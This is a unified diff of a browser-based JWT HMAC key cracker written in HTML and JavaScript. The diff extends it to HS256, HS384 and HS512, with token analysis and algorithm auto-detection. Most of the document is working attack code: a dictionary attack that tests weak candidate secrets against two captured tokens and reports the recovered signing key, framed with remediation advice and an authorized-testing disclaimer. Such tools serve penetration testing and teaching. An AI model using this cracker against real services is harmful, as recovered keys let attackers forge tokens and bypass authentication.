@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JWT HMAC Key Cracker</title>
+    <title>JWT HMAC Key Cracker - Multi Algorithm</title>
     <style>
         body {
             font-family: 'Courier New', monospace;
@@ -25,6 +25,21 @@
             color: #ff6b6b;
             text-align: center;
             margin-bottom: 30px;
+        }
+        .algorithm-selector {
+            background: #1a1a1a;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+            border-left: 4px solid #ff6b6b;
+        }
+        .algorithm-selector select {
+            background: #222;
+            color: #00ff00;
+            border: 1px solid #444;
+            padding: 8px;
+            font-family: inherit;
+            margin: 0 10px;
         }
         .token-input {
             width: 100%;
@@ -56,6 +71,8 @@
             border-left: 4px solid #00ff00;
             white-space: pre-wrap;
             font-size: 14px;
+            max-height: 400px;
+            overflow-y: auto;
         }
         .success {
             color: #4caf50;
@@ -82,27 +99,48 @@
             width: 0%;
             transition: width 0.3s ease;
         }
+        .algorithm-info {
+            background: #222;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔓 JWT HMAC Key Cracker</h1>
+        <h1>🔓 JWT HMAC Key Cracker - Multi Algorithm</h1>
+        
+        <div class="algorithm-selector">
+            <label>🔧 HMAC Algorithm:</label>
+            <select id="algorithmSelect">
+                <option value="auto">Auto-detect from token</option>
+                <option value="HS256">HS256 (HMAC-SHA256)</option>
+                <option value="HS384">HS384 (HMAC-SHA384)</option>
+                <option value="HS512">HS512 (HMAC-SHA512)</option>
+            </select>
+            <div class="algorithm-info" id="algorithmInfo">
+                Select an algorithm or use auto-detect to identify from JWT header
+            </div>
+        </div>
         
         <div>
             <label>Token 1:</label>
             <input type="text" class="token-input" id="token1" 
-                   value="">
+                   value="" placeholder="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMSJ9.signature1">
         </div>
         
         <div>
             <label>Token 2:</label>
             <input type="text" class="token-input" id="token2" 
-                   value="">
+                   value="" placeholder="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMiJ9.signature2">
         </div>
         
         <button onclick="crackKey()">🚀 Start Key Cracking</button>
         <button onclick="testCustomKey()">🔑 Test Custom Key</button>
         <input type="text" id="customKey" placeholder="Enter custom key to test" style="width: 200px;">
+        <button onclick="analyzeTokens()">🔍 Analyze Tokens</button>
         
         <div class="progress" id="progressContainer" style="display: none;">
             <div class="progress-bar" id="progressBar"></div>
@@ -112,6 +150,35 @@
     </div>
 
     <script>
+        // HMAC functions for different algorithms
+        async function hmacSHA256(key, message) {
+            const encoder = new TextEncoder();
+            const keyBuffer = encoder.encode(key);
+            const messageBuffer = encoder.encode(message);
+            
+            const cryptoKey = await crypto.subtle.importKey(
+                'raw', keyBuffer, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
+            );
+            
+            const signature = await crypto.subtle.sign('HMAC', cryptoKey, messageBuffer);
+            return btoa(String.fromCharCode(...new Uint8Array(signature)))
+                .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+        }
+
+        async function hmacSHA384(key, message) {
+            const encoder = new TextEncoder();
+            const keyBuffer = encoder.encode(key);
+            const messageBuffer = encoder.encode(message);
+            
+            const cryptoKey = await crypto.subtle.importKey(
+                'raw', keyBuffer, { name: 'HMAC', hash: 'SHA-384' }, false, ['sign']
+            );
+            
+            const signature = await crypto.subtle.sign('HMAC', cryptoKey, messageBuffer);
+            return btoa(String.fromCharCode(...new Uint8Array(signature)))
+                .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+        }
+
         async function hmacSHA512(key, message) {
             const encoder = new TextEncoder();
             const keyBuffer = encoder.encode(key);
@@ -126,18 +193,57 @@
                 .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
         }
 
+        // Get the appropriate HMAC function based on algorithm
+        function getHmacFunction(algorithm) {
+            switch(algorithm) {
+                case 'HS256': return hmacSHA256;
+                case 'HS384': return hmacSHA384;
+                case 'HS512': return hmacSHA512;
+                default: throw new Error(`Unsupported algorithm: ${algorithm}`);
+            }
+        }
+
+        // Base64URL decode
+        function base64urlDecode(str) {
+            str += '='.repeat((4 - str.length % 4) % 4);
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            return atob(str);
+        }
+
         function parseJWT(token) {
             const parts = token.split('.');
+            if (parts.length !== 3) {
+                throw new Error('Invalid JWT format');
+            }
+            
+            let header;
+            try {
+                header = JSON.parse(base64urlDecode(parts[0]));
+            } catch (e) {
+                throw new Error('Invalid JWT header');
+            }
+            
+            let payload;
+            try {
+                payload = JSON.parse(base64urlDecode(parts[1]));
+            } catch (e) {
+                throw new Error('Invalid JWT payload');
+            }
+            
             return {
+                header: header,
+                payload: payload,
                 signature: parts[2],
-                headerPayload: parts[0] + '.' + parts[1]
+                headerPayload: parts[0] + '.' + parts[1],
+                algorithm: header.alg
             };
         }
 
-        async function testKey(key, jwt1, jwt2) {
+        async function testKey(key, jwt1, jwt2, algorithm) {
             try {
-                const sig1 = await hmacSHA512(key, jwt1.headerPayload);
-                const sig2 = await hmacSHA512(key, jwt2.headerPayload);
+                const hmacFunc = getHmacFunction(algorithm);
+                const sig1 = await hmacFunc(key, jwt1.headerPayload);
+                const sig2 = await hmacFunc(key, jwt2.headerPayload);
                 
                 return sig1 === jwt1.signature && sig2 === jwt2.signature;
             } catch (e) {
@@ -169,19 +275,95 @@
             }
         }
 
+        function updateAlgorithmInfo(algorithm) {
+            const info = document.getElementById('algorithmInfo');
+            const algorithmDetails = {
+                'HS256': 'HMAC with SHA-256 (32-byte output, recommended 32+ byte key)',
+                'HS384': 'HMAC with SHA-384 (48-byte output, recommended 48+ byte key)',
+                'HS512': 'HMAC with SHA-512 (64-byte output, recommended 64+ byte key)'
+            };
+            
+            info.textContent = algorithmDetails[algorithm] || 'Select an algorithm or use auto-detect';
+        }
+
+        function analyzeTokens() {
+            const token1 = document.getElementById('token1').value.trim();
+            const token2 = document.getElementById('token2').value.trim();
+            
+            if (!token1 || !token2) {
+                updateResults('Please provide both JWT tokens for analysis', 'error');
+                return;
+            }
+
+            try {
+                const jwt1 = parseJWT(token1);
+                const jwt2 = parseJWT(token2);
+                
+                updateResults('📊 TOKEN ANALYSIS:', 'info');
+                updateResults(`Token 1 Algorithm: ${jwt1.algorithm}`, 'info');
+                updateResults(`Token 1 Payload: ${JSON.stringify(jwt1.payload)}`, 'info');
+                updateResults(`Token 1 Signature: ${jwt1.signature.substring(0, 20)}...`, 'info');
+                
+                updateResults(`Token 2 Algorithm: ${jwt2.algorithm}`, 'info');
+                updateResults(`Token 2 Payload: ${JSON.stringify(jwt2.payload)}`, 'info');
+                updateResults(`Token 2 Signature: ${jwt2.signature.substring(0, 20)}...`, 'info');
+                
+                // Check algorithm compatibility
+                if (jwt1.algorithm !== jwt2.algorithm) {
+                    updateResults('⚠️  WARNING: Tokens use different algorithms!', 'warning');
+                    updateResults('Key cracking requires tokens with the same algorithm', 'warning');
+                } else {
+                    updateResults(`✅ Both tokens use ${jwt1.algorithm}`, 'success');
+                    
+                    // Auto-select algorithm
+                    document.getElementById('algorithmSelect').value = jwt1.algorithm;
+                    updateAlgorithmInfo(jwt1.algorithm);
+                }
+                
+            } catch (e) {
+                updateResults(`Error analyzing tokens: ${e.message}`, 'error');
+            }
+        }
+
         async function crackKey() {
             const token1 = document.getElementById('token1').value.trim();
             const token2 = document.getElementById('token2').value.trim();
+            const selectedAlgorithm = document.getElementById('algorithmSelect').value;
             
             if (!token1 || !token2) {
                 updateResults('Please provide both JWT tokens', 'error');
                 return;
             }
 
-            const jwt1 = parseJWT(token1);
-            const jwt2 = parseJWT(token2);
+            let jwt1, jwt2, algorithm;
             
-            updateResults('🔍 Starting JWT key cracking attack...', 'info');
+            try {
+                jwt1 = parseJWT(token1);
+                jwt2 = parseJWT(token2);
+                
+                // Determine algorithm
+                if (selectedAlgorithm === 'auto') {
+                    if (jwt1.algorithm !== jwt2.algorithm) {
+                        updateResults('Tokens use different algorithms. Please select manually.', 'error');
+                        return;
+                    }
+                    algorithm = jwt1.algorithm;
+                } else {
+                    algorithm = selectedAlgorithm;
+                }
+                
+                // Validate algorithm support
+                if (!['HS256', 'HS384', 'HS512'].includes(algorithm)) {
+                    updateResults(`Unsupported algorithm: ${algorithm}`, 'error');
+                    return;
+                }
+                
+            } catch (e) {
+                updateResults(`Error parsing tokens: ${e.message}`, 'error');
+                return;
+            }
+            
+            updateResults(`🔍 Starting JWT key cracking attack using ${algorithm}...`, 'info');
             updateResults(`Token 1 signature: ${jwt1.signature.substring(0, 20)}...`, 'info');
             updateResults(`Token 2 signature: ${jwt2.signature.substring(0, 20)}...`, 'info');
 
@@ -203,6 +385,8 @@
                 
                 // HMAC specific
                 'hmac', 'hmackey', 'hmac-key', 'hmac_key', 'HMAC_KEY',
+                'hs256', 'hs256-key', 'hs256_key', 'HS256_KEY',
+                'hs384', 'hs384-key', 'hs384_key', 'HS384_KEY',
                 'hs512', 'hs512-key', 'hs512_key', 'HS512_KEY',
                 
                 // Application patterns
@@ -248,19 +432,21 @@
             let testedCount = 0;
             const totalKeys = wordlist.length;
 
-            updateResults(`📊 Testing ${totalKeys} potential keys...`, 'info');
+            updateResults(`📊 Testing ${totalKeys} potential keys with ${algorithm}...`, 'info');
 
             for (const key of wordlist) {
-                const result = await testKey(key, jwt1, jwt2);
+                const result = await testKey(key, jwt1, jwt2, algorithm);
                 testedCount++;
                 
                 if (result) {
                     updateResults(`\n🎉 SIGNING KEY FOUND: "${key}"`, 'success');
                     updateResults(`🔑 Key length: ${key.length} characters`, 'success');
+                    updateResults(`🔧 Algorithm: ${algorithm}`, 'success');
                     
                     // Double verification
-                    const sig1 = await hmacSHA512(key, jwt1.headerPayload);
-                    const sig2 = await hmacSHA512(key, jwt2.headerPayload);
+                    const hmacFunc = getHmacFunction(algorithm);
+                    const sig1 = await hmacFunc(key, jwt1.headerPayload);
+                    const sig2 = await hmacFunc(key, jwt2.headerPayload);
                     
                     updateResults(`✅ Token 1 verification: ${sig1 === jwt1.signature ? 'PASS' : 'FAIL'}`, 'success');
                     updateResults(`✅ Token 2 verification: ${sig2 === jwt2.signature ? 'PASS' : 'FAIL'}`, 'success');
@@ -271,11 +457,18 @@
                     updateResults('• Complete authentication bypass possible', 'warning');
                     updateResults('• Recommend immediate key rotation', 'warning');
                     
+                    const keyRecommendations = {
+                        'HS256': '• Use at least 256 bits (32 bytes) for HS256',
+                        'HS384': '• Use at least 384 bits (48 bytes) for HS384',
+                        'HS512': '• Use at least 512 bits (64 bytes) for HS512'
+                    };
+                    
                     updateResults('\n🔧 REMEDIATION:', 'info');
                     updateResults('• Generate a cryptographically secure random key', 'info');
-                    updateResults('• Use at least 256 bits (32 bytes) for HS512', 'info');
+                    updateResults(keyRecommendations[algorithm], 'info');
                     updateResults('• Store keys securely (environment variables)', 'info');
                     updateResults('• Implement key rotation policies', 'info');
+                    updateResults('• Use constant-time comparison for verification', 'info');
                     
                     found = true;
                     updateProgress(totalKeys, totalKeys);
@@ -316,6 +509,7 @@
             const customKey = document.getElementById('customKey').value;
             const token1 = document.getElementById('token1').value.trim();
             const token2 = document.getElementById('token2').value.trim();
+            const selectedAlgorithm = document.getElementById('algorithmSelect').value;
             
             if (!customKey) {
                 updateResults('Please enter a custom key to test', 'error');
@@ -327,22 +521,43 @@
                 return;
             }
 
-            const jwt1 = parseJWT(token1);
-            const jwt2 = parseJWT(token2);
+            let jwt1, jwt2, algorithm;
             
-            updateResults(`🔍 Testing custom key: "${customKey}"`, 'info');
+            try {
+                jwt1 = parseJWT(token1);
+                jwt2 = parseJWT(token2);
+                
+                // Determine algorithm
+                if (selectedAlgorithm === 'auto') {
+                    if (jwt1.algorithm !== jwt2.algorithm) {
+                        updateResults('Tokens use different algorithms. Please select manually.', 'error');
+                        return;
+                    }
+                    algorithm = jwt1.algorithm;
+                } else {
+                    algorithm = selectedAlgorithm;
+                }
+                
+            } catch (e) {
+                updateResults(`Error parsing tokens: ${e.message}`, 'error');
+                return;
+            }
             
-            const result = await testKey(customKey, jwt1, jwt2);
+            updateResults(`🔍 Testing custom key: "${customKey}" with ${algorithm}`, 'info');
+            
+            const result = await testKey(customKey, jwt1, jwt2, algorithm);
             
             if (result) {
                 updateResults(`🎉 SUCCESS! Custom key "${customKey}" is valid`, 'success');
                 updateResults(`🔑 Key length: ${customKey.length} characters`, 'success');
+                updateResults(`🔧 Algorithm: ${algorithm}`, 'success');
             } else {
                 updateResults(`❌ Custom key "${customKey}" does not match`, 'error');
                 
                 // Show what the signatures would be
-                const sig1 = await hmacSHA512(customKey, jwt1.headerPayload);
-                const sig2 = await hmacSHA512(customKey, jwt2.headerPayload);
+                const hmacFunc = getHmacFunction(algorithm);
+                const sig1 = await hmacFunc(customKey, jwt1.headerPayload);
+                const sig2 = await hmacFunc(customKey, jwt2.headerPayload);
                 
                 updateResults(`Expected signature 1: ${sig1.substring(0, 20)}...`, 'info');
                 updateResults(`Actual signature 1:   ${jwt1.signature.substring(0, 20)}...`, 'info');
@@ -351,19 +566,22 @@
             }
         }
 
-        // Allow Enter key to trigger custom key test
+        // Event listeners
+        document.getElementById('algorithmSelect').addEventListener('change', function(e) {
+            updateAlgorithmInfo(e.target.value);
+        });
+
         document.getElementById('customKey').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 testCustomKey();
             }
         });
 
-        // Clear results on page load
-        updateResults('🔓 JWT HMAC Key Cracker Ready', 'info');
-        updateResults('Load two JWT tokens and click "Start Key Cracking"', 'info');
-        updateResults('This tool performs dictionary attacks against HMAC-signed JWTs', 'info');
+        // Initialize
+        updateResults('🔓 JWT HMAC Key Cracker Ready (Multi-Algorithm)', 'info');
+        updateResults('Supports HS256, HS384, and HS512 algorithms', 'info');
+        updateResults('Load two JWT tokens and click "Analyze Tokens" first', 'info');
         updateResults('⚠️  For educational and authorized testing only!', 'warning');
     </script>
 </body>
 </html>
-                
